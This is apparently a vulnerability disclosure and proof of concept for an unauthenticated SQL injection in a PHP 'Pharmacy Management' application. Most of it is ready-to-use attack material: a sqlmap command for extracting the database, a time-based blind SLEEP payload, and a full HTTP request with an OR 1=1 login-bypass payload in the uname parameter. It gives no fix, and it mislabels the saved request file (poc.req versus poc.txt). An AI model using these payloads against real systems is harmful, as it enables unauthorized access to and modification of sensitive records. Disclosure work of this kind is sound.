# Pharmacy Management System - 'uname , pswd' SQL Injection (Unauthenticated)

1. Description:
----------------------

Pharmacy Management 1.0 allows SQL Injection via parameter 'uname , pswd' in
/Pharmacy-Management/php/validateCredentials.php Exploiting this issue could allow an attacker to compromise
the application, access or modify data, or exploit latent vulnerabilities
in the underlying database.


2. Proof of Concept:
----------------------

In Burpsuite intercept the request from the affected page with
'uname , pswd' parameter and save it like poc.req. Then run SQLmap to extract the
data from the database:

sqlmap -r poc.txt --dbms=mysql


3. Example payload:
----------------------

time-based blind
Payload: action=is_admin&pswd=3&uname=test' AND (SELECT 6097 FROM (SELECT(SLEEP(5)))eTQx) AND 'sZpk'='sZpk


4. Burpsuite request:
----------------------

GET /Pharmacy-Management/php/validateCredentials.php?action=is_admin&pswd=3&uname=Test%27%20OR%201%3d1%20OR%20%27ns%27%3d%27ns HTTP/1.1<br>
Host: localhost<br>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<br>
Accept-Encoding: gzip, deflate<br>
Accept-Language: en-us,en;q=0.5<br>
Cache-Control: no-cache<br>
Cookie: PHPSESSID=v0ueat0ma15mnsfmo6o187spcd<br>
Referer: http://localhost/Pharmacy-Management/<br>
User-Agent: Mozilla/5.0 (Windows NT 10.0; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.0 Safari/537.36<br>




